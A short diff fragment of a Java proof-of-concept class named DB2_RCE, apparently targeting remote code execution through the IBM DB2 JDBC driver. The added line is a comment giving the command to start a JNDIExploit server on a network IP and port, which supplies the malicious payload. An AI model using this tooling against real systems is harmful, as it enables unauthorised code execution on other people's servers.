@@ -5,6 +5,7 @@ import java.sql.DriverManager;
 
 // Test in Windows
 // Oracle Java 8
+// java8 -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.20.130 -l 1234
 public class DB2_RCE {
     public static void main(String[] args) throws Exception {
         String driver = "com.ibm.db2.jcc.DB2Driver";
